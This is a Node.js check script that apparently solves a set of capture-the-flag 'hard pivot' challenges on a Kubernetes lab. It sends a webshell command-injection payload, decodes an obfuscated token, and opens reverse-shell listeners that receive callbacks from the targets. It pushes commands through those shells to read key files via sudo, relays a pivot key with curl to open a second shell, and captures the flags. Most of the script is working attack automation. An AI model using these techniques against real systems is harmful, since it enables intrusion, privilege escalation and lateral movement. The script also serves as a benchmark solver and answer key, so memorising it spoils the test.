#!/usr/bin/env node

const fs = require('fs');
const path = require('path');
const net = require('net');
const { spawnSync } = require('child_process');
const {
  ROOT_DIR,
  ensureDeployed,
  nodeHostIp,
  startTraefikPortForward,
  stopChild,
  challengeRequestUrl
} = require('./k8s-lib');
const { DEFAULT_BASE_DOMAIN, selectedBySlug, flagValue } = require('./benchmark-config');

const stamp = new Date().toISOString().replace(/[:.]/g, '-');
const artifactDir = path.join(ROOT_DIR, 'artifacts', 'check', `hard-pivots-k8s-${stamp}`);
const commandLogPath = path.join(artifactDir, 'commands.log');
const BASE_DOMAIN = process.env.LUXORA_BASE_DOMAIN || DEFAULT_BASE_DOMAIN;

fs.mkdirSync(artifactDir, { recursive: true });

const HARD = {
  pivot: {
    route: '/pivot/silver',
    service: 'pivot-silver',
    relay: 'pivot-relay',
    keyPath: '/tmp/rndsecurity-isolated/pivot-silver/pivot.key',
    briefPath: '/tmp/rndsecurity-isolated/pivot-silver/pivot-brief.txt',
    flagPath: '/tmp/rndsecurity-pivot/final-flag.txt',
    expectedFlag: flagValue(
      selectedBySlug.pivot.layer,
      selectedBySlug.pivot.slug,
      selectedBySlug.pivot.difficulty,
      selectedBySlug.pivot.points,
      selectedBySlug.pivot.technique
    ),
    artifactKey(index) {
      return ((index * 17) ^ 0x5d ^ ((index + 5) * 9)) & 0xff;
    }
  },
  chain: {
    route: '/chain/silver',
    service: 'chain-silver',
    relay: 'chain-relay',
    keyPath: '/tmp/rndsecurity-isolated/chain-silver/chain-pivot.key',
    briefPath: '/tmp/rndsecurity-isolated/chain-silver/chain-brief.txt',
    flagPath: '/tmp/rndsecurity-chain/final-flag.txt',
    expectedFlag: flagValue(
      selectedBySlug.chain.layer,
      selectedBySlug.chain.slug,
      selectedBySlug.chain.difficulty,
      selectedBySlug.chain.points,
      selectedBySlug.chain.technique
    ),
    artifactKey(index) {
      return ((index * 23) ^ 0x91 ^ ((index + 7) * 13)) & 0xff;
    }
  },
  webshell: {
    route: '/webshell/silver',
    service: 'webshell-silver',
    relay: 'webshell-relay',
    keyPath: '/tmp/rndsecurity-isolated/webshell-silver/webshell-pivot.key',
    briefPath: '/tmp/rndsecurity-isolated/webshell-silver/webshell-brief.txt',
    flagPath: '/tmp/rndsecurity-webshell/final-flag.txt',
    expectedFlag: flagValue(
      selectedBySlug.webshell.layer,
      selectedBySlug.webshell.slug,
      selectedBySlug.webshell.difficulty,
      selectedBySlug.webshell.points,
      selectedBySlug.webshell.technique
    ),
    unlock(request, curlWithStatus) {
      return curlWithStatus('unlock-webshell', [
        '-X',
        'POST',
        request.url,
        '-H',
        `Host: ${request.host}`,
        '-H',
        'Content-Type: application/x-www-form-urlencoded',
        '--data-urlencode',
        'code=system("id")'
      ]);
    }
  },
  persist: {
    route: '/persist/silver',
    service: 'persist-silver',
    relay: 'persist-relay',
    keyPath: '/tmp/rndsecurity-isolated/persist-silver/persist-pivot.key',
    briefPath: '/tmp/rndsecurity-isolated/persist-silver/persist-brief.txt',
    flagPath: '/tmp/rndsecurity-persist/final-flag.txt',
    expectedFlag: flagValue(
      selectedBySlug.persist.layer,
      selectedBySlug.persist.slug,
      selectedBySlug.persist.difficulty,
      selectedBySlug.persist.points,
      selectedBySlug.persist.technique
    ),
    unlock(request, curlWithStatus) {
      return curlWithStatus('unlock-persist', [
        '-X',
        'POST',
        request.url,
        '-H',
        `Host: ${request.host}`,
        '-H',
        'Content-Type: application/x-www-form-urlencoded',
        '-d',
        'method=cron'
      ]);
    }
  },
  container: {
    route: '/container/silver',
    service: 'container-silver',
    relay: 'container-relay',
    keyPath: '/tmp/rndsecurity-isolated/container-silver/container-pivot.key',
    briefPath: '/tmp/rndsecurity-isolated/container-silver/container-brief.txt',
    flagPath: '/tmp/rndsecurity-container/final-flag.txt',
    expectedFlag: flagValue(
      selectedBySlug.container.layer,
      selectedBySlug.container.slug,
      selectedBySlug.container.difficulty,
      selectedBySlug.container.points,
      selectedBySlug.container.technique
    ),
    unlock(request, curlWithStatus) {
      return curlWithStatus('unlock-container', [
        `${request.url}?socket=docker`,
        '-H',
        `Host: ${request.host}`
      ]);
    }
  }
};

const selectedTargets = process.argv.slice(2);
const targets = selectedTargets.length > 0 ? selectedTargets : Object.keys(HARD);
for (const target of targets) {
  if (!HARD[target]) {
    throw new Error(`unknown hard pivot target: ${target}`);
  }
}

let commandIndex = 0;
const summary = {
  artifactDir,
  baseDomain: BASE_DOMAIN,
  targets,
  results: {}
};

function writeFile(name, data) {
  const filePath = path.join(artifactDir, name);
  fs.writeFileSync(filePath, data);
  return filePath;
}

function appendCommandLog(text) {
  fs.appendFileSync(commandLogPath, text);
}

function shellQuote(value) {
  if (/^[A-Za-z0-9_./:=@%+-]+$/.test(value)) return value;
  return `'${value.replaceAll("'", "'\\''")}'`;
}

function run(label, command, args, options = {}) {
  commandIndex += 1;
  const id = String(commandIndex).padStart(2, '0');
  const commandLine = [command, ...args].map(shellQuote).join(' ');
  appendCommandLog(`\n[${id}] $ ${commandLine}\n`);

  const result = spawnSync(command, args, {
    cwd: ROOT_DIR,
    env: options.env || process.env,
    encoding: 'utf8',
    timeout: options.timeoutMs || 180_000
  });

  const stdoutPath = writeFile(`${id}-${label}.stdout.txt`, result.stdout || '');
  const stderrPath = writeFile(`${id}-${label}.stderr.txt`, result.stderr || '');
  const status = result.status === null ? 'signal' : result.status;
  appendCommandLog(`[${id}] exit=${status} stdout=${path.relative(ROOT_DIR, stdoutPath)} stderr=${path.relative(ROOT_DIR, stderrPath)}\n`);

  if (result.error && !options.allowFailure) {
    throw result.error;
  }
  if (result.status !== 0 && !options.allowFailure) {
    throw new Error(`${label} failed with exit ${result.status}; see ${stdoutPath} and ${stderrPath}`);
  }
  return result.stdout || '';
}

function curlWithStatus(label, args, options = {}) {
  const stdout = run(
    label,
    'curl',
    ['-s', '--retry', '30', '--retry-delay', '1', '--retry-all-errors', '--retry-connrefused', '-w', '\n__HTTP_STATUS__:%{http_code}', ...args],
    { ...options, allowFailure: true }
  );
  const marker = '\n__HTTP_STATUS__:';
  const idx = stdout.lastIndexOf(marker);
  if (idx === -1) {
    throw new Error(`${label}: missing status marker`);
  }
  return {
    body: stdout.slice(0, idx),
    status: Number.parseInt(stdout.slice(idx + marker.length).trim(), 10)
  };
}

function ror8(value, bits) {
  return ((value >> bits) | (value << (8 - bits))) & 0xff;
}

function solveArtifact(source, keyFn) {
  const payloadMatch = source.match(/const __payload = "([0-9a-f]+)"/i);
  const orderMatch = source.match(/const __order = \[([0-9,\s]+)\]/);
  if (!payloadMatch || !orderMatch) {
    throw new Error('artifact did not expose the expected encoded payload and order table');
  }

  const encoded = payloadMatch[1].match(/../g).map((byte) => Number.parseInt(byte, 16));
  const order = orderMatch[1].split(',').map((value) => Number.parseInt(value.trim(), 10));
  const recovered = new Array(order.length);
  encoded.forEach((byte, position) => {
    const sourceIndex = order[position];
    recovered[sourceIndex] = ror8(byte, (sourceIndex % 5) + 1) ^ keyFn(sourceIndex);
  });
  return Buffer.from(recovered).toString('utf8');
}

function appendPath(baseUrl, pathSuffix) {
  const normalizedBase = baseUrl.endsWith('/') ? baseUrl.slice(0, -1) : baseUrl;
  const normalizedSuffix = pathSuffix.startsWith('/') ? pathSuffix : `/${pathSuffix}`;
  return `${normalizedBase}${normalizedSuffix}`;
}

function unlockTarget(name, cfg, request) {
  if (cfg.artifactKey) {
    const artifact = curlWithStatus(`artifact-${name}`, [appendPath(request.url, '/artifact.js'), '-H', `Host: ${request.host}`]);
    if (artifact.status !== 200) throw new Error(`${name} artifact returned ${artifact.status}`);
    writeFile(`${name}-artifact.js`, artifact.body);
    const token = solveArtifact(artifact.body, cfg.artifactKey);
    const unlocked = curlWithStatus(`unlock-${name}`, [`${request.url}?payload=${encodeURIComponent(token)}`, '-H', `Host: ${request.host}`]);
    if (unlocked.status !== 200) throw new Error(`${name} unlock returned ${unlocked.status}: ${unlocked.body}`);
    writeFile(`${name}-unlock.json`, unlocked.body);
    return token;
  }

  const unlocked = cfg.unlock(request, curlWithStatus);
  if (unlocked.status !== 200) throw new Error(`${name} unlock returned ${unlocked.status}: ${unlocked.body}`);
  writeFile(`${name}-unlock.json`, unlocked.body);
  const parsed = JSON.parse(unlocked.body);
  if (!parsed.stageToken) throw new Error(`${name} unlock did not return a stage token`);
  return parsed.stageToken;
}

function triggerEdgeCallback(name, request, tokenHeader, token, callbackHost, port) {
  const response = curlWithStatus(
    `trigger-edge-${name}`,
    [
      '-X',
      'POST',
      appendPath(request.url, '/debug'),
      '-H',
      `Host: ${request.host}`,
      '-H',
      'Content-Type: application/json',
      '-H',
      `${tokenHeader}: ${token}`,
      '-d',
      JSON.stringify({ host: callbackHost, port })
    ],
    { timeoutMs: 30_000 }
  );
  if (response.status !== 200) {
    throw new Error(`${name} edge callback trigger failed: ${response.status} ${response.body}`);
  }
}

function readKeyThroughEdgeShell(name, cfg, request, tokenHeader, token, callbackHost) {
  return new Promise((resolve, reject) => {
    let settled = false;
    const server = net.createServer();

    const finish = (err, value) => {
      if (settled) return;
      settled = true;
      clearTimeout(timer);
      server.close();
      if (err) reject(err);
      else resolve(value);
    };

    const timer = setTimeout(() => finish(new Error(`${name} edge shell did not return pivot key`)), 30_000);
    server.on('error', (err) => finish(err));
    server.on('connection', (socket) => {
      let buffer = '';
      socket.on('error', () => {});
      socket.on('data', (chunk) => {
        buffer += chunk.toString('utf8');
        if (buffer.includes(cfg.relay) && buffer.includes('Permission denied')) {
          socket.end('exit\n');
          finish(null, buffer);
        }
      });
      socket.write(`cat ${cfg.keyPath} 2>&1 || true\n`);
      socket.write(`sudo find ${cfg.keyPath} -maxdepth 0 -exec cat {} \\;\n`);
      socket.write(`sudo find ${cfg.briefPath} -maxdepth 0 -exec cat {} \\;\n`);
    });

    server.listen(0, '0.0.0.0', () => {
      triggerEdgeCallback(name, request, tokenHeader, token, callbackHost, server.address().port);
    });
  });
}

function pivotThroughEdgeShell(name, cfg, request, tokenHeader, token, callbackHost) {
  return new Promise((resolve, reject) => {
    const pivotMarker = `${name.toUpperCase()}_PIVOT_${Date.now()}`;
    let settled = false;
    const edgeServer = net.createServer();
    const pivotServer = net.createServer();

    const finish = (err, value) => {
      if (settled) return;
      settled = true;
      clearTimeout(timer);
      edgeServer.close();
      pivotServer.close();
      if (err) reject(err);
      else resolve(value);
    };

    const timer = setTimeout(() => finish(new Error(`${name} pivot shell did not return final flag`)), 45_000);

    edgeServer.on('error', (err) => finish(err));
    pivotServer.on('error', (err) => finish(err));

    edgeServer.on('connection', (socket) => {
      socket.on('error', () => {});
      socket.write(`sudo find ${cfg.keyPath} -maxdepth 0 -exec cat {} \\; > /tmp/${name}-pivot-key.txt\n`);
      socket.write(`pivot_key=$(cat /tmp/${name}-pivot-key.txt)\n`);
      socket.write(`curl -fsS -X POST http://${cfg.relay}:8081/callback -H "X-Pivot-Key: $pivot_key" -H "Content-Type: application/json" -d '{"host":"${callbackHost}","port":${pivotServer.address().port}}'\n`);
      socket.write('sleep 2\n');
      socket.write('exit\n');
    });

    pivotServer.on('connection', (socket) => {
      let buffer = '';
      socket.on('error', () => {});
      socket.on('data', (chunk) => {
        buffer += chunk.toString('utf8');
        if (buffer.includes(cfg.expectedFlag)) {
          socket.end('exit\n');
          finish(null, buffer);
        }
      });
      socket.write(`echo ${pivotMarker}\n`);
      socket.write(`cat ${cfg.flagPath} 2>&1 || true\n`);
      socket.write(`sudo find ${cfg.flagPath} -maxdepth 0 -exec cat {} \\;\n`);
    });

    edgeServer.listen(0, '0.0.0.0', () => {
      pivotServer.listen(0, '0.0.0.0', () => {
        triggerEdgeCallback(name, request, tokenHeader, token, callbackHost, edgeServer.address().port);
      });
    });
  });
}

async function main() {
  appendCommandLog(`hard pivot k8s check started ${new Date().toISOString()}\n`);
  appendCommandLog(`logs: ${artifactDir}\n`);

  run('verify-k8s-manifests', 'node', ['scripts/verify-k8s-manifests.js']);
  ensureDeployed(BASE_DOMAIN);
  const portForward = await startTraefikPortForward(artifactDir);
  const callbackHost = nodeHostIp();
  summary.callbackHost = callbackHost;
  summary.ingressPort = portForward.localPort;

  try {
    for (const target of targets) {
      const cfg = HARD[target];
      const request = challengeRequestUrl(target, '/', portForward.localPort);
      const token = unlockTarget(target, cfg, request);
      const tokenHeader = cfg.artifactKey ? 'X-Debug-Token' : 'X-Stage-Token';
      const edgeBuffer = await readKeyThroughEdgeShell(target, cfg, request, tokenHeader, token, callbackHost);
      writeFile(`${target}-edge-shell.txt`, edgeBuffer);
      if (!edgeBuffer.includes(cfg.relay) || !edgeBuffer.includes('Permission denied')) {
        throw new Error(`${target} edge shell did not expose relay briefing and privilege boundary`);
      }

      const pivotBuffer = await pivotThroughEdgeShell(target, cfg, request, tokenHeader, token, callbackHost);
      writeFile(`${target}-pivot-shell.txt`, pivotBuffer);
      if (!pivotBuffer.includes(cfg.expectedFlag)) {
        throw new Error(`${target} pivot shell did not read the expected final flag`);
      }

      summary.results[target] = {
        unlocked: true,
        edgeShell: true,
        pivotShell: true,
        flag: cfg.expectedFlag
      };
      console.log(`PASS ${target}-silver hard pivot k3s check`);
    }

    writeFile('summary.json', `${JSON.stringify(summary, null, 2)}\n`);
    console.log(`PASS hard pivot set: ${targets.join(', ')}`);
    console.log(`Callback host: ${callbackHost}`);
    console.log(`Artifacts: ${artifactDir}`);
  } finally {
    stopChild(portForward.child);
  }
}

main().catch((error) => {
  console.error(error instanceof Error ? error.message : String(error));
  process.exitCode = 1;
});
